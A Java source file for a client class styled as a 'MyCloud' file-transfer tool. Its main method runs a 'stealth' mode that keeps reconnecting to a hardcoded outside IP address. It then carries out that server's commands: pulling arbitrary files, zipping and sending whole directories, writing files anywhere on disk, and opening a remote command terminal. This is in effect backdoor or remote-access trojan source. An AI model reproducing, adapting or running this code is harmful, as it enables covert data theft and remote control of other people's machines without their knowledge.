
import java.io.*;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Scanner;


/**
 * Created by Obada on 2016-09-12.
 */
 class Client
{

    private InputStream input;
    private OutputStream output;
    private Socket socket;
    private String path=System.getProperty("user.home") + "/Desktop";
    /*
     this constructor will be called by the server and it doesn't create a folder for the client either on the server side or the client's side
    */
    Client(Socket socket) {connect(socket);}
    /*
    this constructor will be called by the client where he can specify the name of the folder on his desktop
     */
    Client(Socket socket,String folder)
    {
        path = path+"/"+folder;
        File file = new File(path);
        file.mkdir();
        connect(socket);

    }
    private void connect(Socket sock)
    {
        this.socket = sock;
        try {
            input = socket.getInputStream();
            output = socket.getOutputStream();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
        /*
           Receive a string encrypted with AES and encoded with base64
         */
    String getRequest() throws Exception
    {
        ObjectInputStream in = new ObjectInputStream(input);
        byte[] bytes;
        if ((bytes = (byte[]) in.readObject()) != null) {
            //decrypt the byte array
            byte[] decrypted = Utilities.decrypt(bytes);
            //decoded with base64
            byte[] valueDecoded = Base64.getDecoder().decode(decrypted);
            //return the string representation
            return new String(valueDecoded);
        }
        //client disconnected
        return "";
    }

    /*
      Send a string encoded with base64 and encrypted with AES 128 bit
    */
    void sendMsg(String msg) throws Exception {
        ObjectOutputStream out = new ObjectOutputStream(output);
        //decode the msg into base64
        byte[] bytesEncoded = Base64.getEncoder().encode(msg.getBytes());
        //encrypt the byte array
        byte[] encrypted = Utilities.encrypt(bytesEncoded);
        //send the encrypted array
        out.writeObject(encrypted);
        }

        /*
            listen for requests and handle them , "just some test cases here for files transfer"
         */
    int listen()
    {
        String request;
        String next;
        Scanner scan;
        String filePathTitleExtension;
        String filePath;
        String dirPath;
        String title;
        String extension;
        String oldPath;
        try {
            while (!(request = getRequest()).equals(""))
            {
                scan = new Scanner(request);
                next = scan.next();
                switch (next)
                {
                    case "get":
                        filePathTitleExtension = request.substring(4,request.length());
                        //send a notification for the client on the Server side to receive the file
                        sendMsg("upload "+filePathTitleExtension);
                        filePath = scan.next();
                        sendFile(filePath);
                        break;
                    case "get-dir":
                        //zip the dir first,the zip folder will be created in the /tmp dir
                        dirPath = scan.next();
                        Utilities.zipDir(new File(dirPath),System.getProperty("java.io.tmpdir")+"/dir.zip");
                        //notify client to receive
                        filePathTitleExtension = request.substring(8,request.length());
                        sendMsg("upload "+ filePathTitleExtension);
                        //send the file
                        sendFile(System.getProperty("java.io.tmpdir")+"/dir.zip");
                        break;
                    case "upload":
                        //get rid of received file path on the client on the Server side
                        scan.next();
                        title = scan.next();
                        extension = scan.next();
                        getFile(path+"/"+title+"."+extension);
                        break;
                    case "upload-dir":
                        //get rid of received file path in the client side
                        scan.next();
                        title = scan.next();
                        extension = scan.next();
                        getFile(path+"/"+title+"."+extension);
                        break;
                    // syntax upload-to filePathOnClientSide title extension to filePathToSaveTo "on this client"
                    case "upload-to":
                        //get rid of received file path in the client side
                        scan.next();
                        title = scan.next();
                        extension = scan.next();
                        // get rid of the keyword "to"
                        scan.next();
                        oldPath = getPath();
                        //save to the directory requested by Server
                        setPath(scan.next());
                        getFile(path+"/"+title+"."+extension);
                        //switch back to the old path
                        setPath(oldPath);
                        break;
                    case "upload-dir-to":
                        //get rid of received file path in the client side
                        scan.next();
                        title = scan.next();
                        extension = scan.next();
                        // get rid of the keyword "to"
                        scan.next();
                        oldPath = getPath();
                        //save to the directory requested by Server
                        setPath(scan.next());
                        getFile(path+"/"+title+"."+extension);
                        //switch back to the old path
                        setPath(oldPath);
                        break;
                    //close connection
                    case "close":
                        close();
                        return 0;
                    case "cmd":
                        try {
                            new Executor(new String[]{System.getProperty("os.name"), System.getProperty("user.home")}, this);
                        }catch(Exception e)
                        {
                            System.out.println("Terminal error..");
                        }
                        break;
                    default:
                        System.out.print(request);

                }
                scan.close();
            }
            return -1;
            //if Server goes down will try to restart this client if it was running on the Client side
        } catch (Exception e) {
            //close streams if any is still open
            e.printStackTrace();
            close();
            return -1;
        }
    }
        /*
            send files to clients Encrypted with AES 128 bit
         */
        void sendFile(String location) {
            //file to send
            File file = new File(location);
            // wrap OutputStream in an ObjectOutputStream
            ObjectOutputStream outO;
            //bytes array to read bytes from the file
            byte[] bytes=new byte[1024*1024];
            //count of bytes read from the file
            System.out.println("Uploading file");
            int count;
            try (FileInputStream inFile = new FileInputStream(file))
            {
                //init ObjectOutputStream
                outO = new ObjectOutputStream(output);
                //write byte arrays to a the output stream
                while ((count=inFile.read(bytes))>0)
                {
                    //an array of the bytes read from the file
                    byte[] fileBytes = Arrays.copyOfRange(bytes,0,count);
                    //encrypted array
                    byte[] encrypted = Utilities.encrypt(fileBytes);
                    //write the encrypted array as an object
                    outO.writeObject(encrypted);
                }
                //End of file signal
                outO.writeObject(null);
                System.out.println("Upload complete!");
            //FileNotFoundException then send a death signal "null" to the receiver client so it doesn't hang
            } catch (Exception e) {
                e.printStackTrace();
                try {
                    outO = new ObjectOutputStream(output);
                    outO.writeObject(null);
                    System.out.println("upload failed");
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        }
        /*
               receive files from the clients
        */
        private void getFile(String location)
        {
            System.out.println("Downloading file...");
            //file to write to
            File file = new File(location);
            //wrap InputStream in an ObjectInputStream
            ObjectInputStream in;
            try (OutputStream out = new FileOutputStream(file))
            {
                //init ObjectInputStream
                in = new ObjectInputStream(input);
                byte[] decrypted;
                byte[] bytes;
                //read the byte arrays of the sent file
                while ((bytes= (byte[]) in.readObject())!=null)
                {
                    //decrypt them
                    decrypted=Utilities.decrypt(bytes);
                    //write the decrypted arrays to the file
                    out.write(decrypted);
                }
                System.out.println("Download complete!");
                //close the FileOutputStream
                out.close();
            } catch (Exception e)
            {
                e.printStackTrace();
            }
        }
        /*
            close the connection for this client
         */
        void close()
        {
            //put each close statement in a try catch so we make sure all unclosed to close :p
            try {
                output.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                input.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        void setPath(String path)
        {this.path=path;}

        private String getPath()
        {return path;}
        /*
        check if a request fulfill our protocol: <Command><SPACE><Path><SPACE><TitleOfFile><SPACE><ExtensionOfFile>//OPTIONAL//<to><PathToSaveTo>
        note that TitleOfFile is the new name you give to your downloaded(get)/uploaded(upload) file
         */
        private boolean valid(String command)
        {
            try
            {
                //list of all commands we have
                ArrayList<String> valides = new ArrayList<>();
                valides.add("upload"); valides.add("upload-to"); valides.add("upload-dir"); valides.add("upload-dir-to"); valides.add("cmd");
                valides.add("get"); valides.add("get-dir");
                //if Scanner crash then the protocol is not fulfilled
                Scanner scan = new Scanner(command);
                String token;
                token = scan.next();
                //check if the first token is a valid command
                if(!valides.contains(token))
                    throw new Exception("Invalid command");
                token = scan.next();
                //if the path is invalid
                if(token.length()==0)
                    throw new Exception("Invalid path");
                token = scan.next();
                //if the file name is invalid
                if(token.length()==0)
                    throw new Exception("Invalid name");
                //if the extension is invalid
                if(token.length()==0)
                    throw new Exception("Invalid extension");
            }catch(Exception e)
            {
                help();
                return false;
            }
            return true;
        }
        private void help()
        {
            System.out.println
                    (
                    "Syntax: <Command> <Path> <FileName> <Extension>\n" +
                    "Sample: get /home/<username>/Desktop/FileName.zip newFileName zip\n" +
                    "Commands: upload, get, upload-dir, upload-to, upload-dir-to, cmd"
                    );
        }
    /*
    Listen and send requests to Server
     */
       static void run(String[] args)  throws Exception
        {
            System.out.println("Welcome to MyCloud\nTrying to connect");
            Socket sock = new Socket(args[0], Integer.parseInt(args[1]));
            //init client and the download folder
            Client client = new Client(sock, "MyCloud");
            System.out.println("connected!");
            //auth with server
            client.sendMsg(client.getRequest());
            new Thread() {
                public void run() {
                    client.listen();
                }
            }.start();
            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
            String request;
            String next;
            Scanner scan;
            while ((request = in.readLine()) != null)
            {
                //check is the request fulfill the protocol
                if(!client.valid(request))
                    continue;
                scan = new Scanner(request);
                next = scan.next();
                switch (next)
                {
                    case "upload":
                        //send the request to the client on the Server side
                        client.sendMsg(request);
                        //send the file
                        client.sendFile(scan.next());
                        break;
                    case "dir-change":
                        //change the saving directory
                        client.setPath(scan.next());
                        break;
                    case "upload-dir":
                        //compress the dir
                        Utilities.zipDir(new File(scan.next()),System.getProperty("java.io.tmpdir")+"/dir.zip");
                        //notify the server/client
                        client.sendMsg(request);
                        //send the compressed file
                        client.sendFile(System.getProperty("java.io.tmpdir")+"/dir.zip");

                    default:
                        client.sendMsg(request);

                }
                scan.close();
            }
        }
    /*
    Run this client in stealth mode where you can only listen to Server and execute the requests
     */
        private static int stealth(String[] args) throws Exception {
            //keep attempting to connect if connection is refused #ServerIsOffline
            Socket sock=null;
            while(sock==null)
            try {
                sock = new Socket(args[0], Integer.parseInt(args[1]));
            } catch (IOException e) {
                Thread.sleep(1000);
                continue;
            }
            //init client
            Client client = new Client(sock);
            //auth with server "Send the echo message back"
            client.sendMsg(client.getRequest());
            return client.listen();
        }

    public static void main (String[]args)throws Exception
    {
        int integer;
        integer = stealth(new String[]{"83.253.236.204","1234"});
        // try connecting again if connection is not closed normally
        while(integer==-1) integer = stealth(new String[]{"83.253.236.204", "1234"});
    }
    }